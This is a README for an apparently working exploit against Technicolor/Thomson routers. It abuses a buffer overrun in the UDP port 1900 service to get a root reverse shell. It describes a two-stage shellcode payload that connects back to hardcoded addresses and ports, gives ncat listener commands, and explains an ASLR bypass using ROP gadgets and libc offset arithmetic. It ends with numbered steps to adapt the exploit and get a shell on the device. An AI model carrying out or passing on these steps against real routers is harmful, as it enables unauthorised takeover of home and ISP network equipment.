## Welcome to rev1900 R&D


Intro : 

first things first , since this dump started somewhat with a bunch of mysteriously files , let me explain what this is : 

this will give a root shell ( connect back  mode ) on, I think,  all ... technicolor / thomson  routers that are running 2.6  / 2.4 kernels , it goes a long way...  from aprox 2009 till now 2019 , so 10 years scope , on the run.... I have used it  on tg787 tg784 tg789 , more recently tg 789vacv2  and others  ... I am releasing this because this was getting dust on the hard drives, and maybe someone will be interested in enhacing the funcionality and give some life to it, it is pretty raw now, has hardocded ips ports offsets  and waht not... . 

it was quite a challenge back them to develop this ... the crossed compiled tools without reference toolchain,  the  live endless debugging  sessions , the crashes  step ins. memory access ,   it was slow  process but a frutuosos one for me,  with persistence and a lot os patience  it came out pretty reliable. 
A one man show! and a lonely ride indeed , good times. 

may it serve you on your  quest and shed some light on your own path.

Tut :  

this is a multi stage shellcode  exploit that takes advantage from a udp 1900 service buffer overrun.

due to buffer size constraints, exploitation cannot be done in one shot , so it had to be split in a 2 stage payload : 


    stage one -> generated by genex.py  ( connect back port 444 ip 10.0.0.1 and download stage two to memory )
    stage two -> generated by genex2.py  ( connect back port 4444 ip 10.0.1 and redirect shell fds to listner , you all have a shell withou prompt when this reaches here)
    ( @toDo : rename these files for something more understandable  and add command line arguments ( connect back ip , port , etc ... ) )

    these have hardcoded ip addresses and ports ( 10.0.0.1 and ports 444 , 4444 ) 
    cat listener.sh 
    
        ncat -vv -l 444 --keep-open -c 'cat exit' & 
        ncat -v -l 444 --keep-open

this is a already working exploit , unfortunally it has that hardcoded stuff , some more thinking has to be made because , generating null free shellcode for connect back ip 10.0.0.1 takes different size than for example 192.168.1.1 , and size is a constraint here.

one final remark , this one uses some rop gadgets to bypass aslr , and libc location changes between models and firmware versions.  if a close look is taken on ex extg789vacv2.py , you will see the comments after the registers overwrites. are the relative offsets regarding /lib/libc.so.0 location ... so how to get that reference base address from libc , i did not check if this information was dumped to telnet console , it might , but with serial console if you launch the reference crash test udp.py it will print crash dump report with libc address , next you will have to adapt exploiy.py , better look at extg789vacv2.py as it has the offset math comment already , would like to automate this also .... 

so ... what has to be done : 

 1>  run udp.py , and grab the offset of libc from serial console . 
 2>  adapt ext789vacv2.py  ( ra , s0 , s4 , s2  registers )  ( libc: 0x2ae50000  , ra = hex(0x2ae50000+0x60330) , and so on .... )
 3>  (listner.sh) ncat -vv -l 444 --keep-open -c 'cat exit' &  ncat -v -l 444 --keep-open 
 4>  adjust UDP_IP = "10.0.0.138" on ext789vacv2.py and make sure you are in 10.0.0.1 ( all of them listen on 10.0.0.138 , so this should not be a problem )   and sock.setsockopt(socket.SOL_SOCKET, 25, 'eth1') <---- eth1 interface ( choose yours , not relevant to shellcode payloads ... ) 
 5> run python ext789vacv2.py
 6> you should see some activity on the first ncat ( this is good ) 
 7> you should see some activity on the second ncat , at this point you have a reverse shell on this console, just type ls and the look for youtself
 8> the rest is up to you . 


 be wise , be responsible. 

 Cheers 
 keep on rolling :) 

 





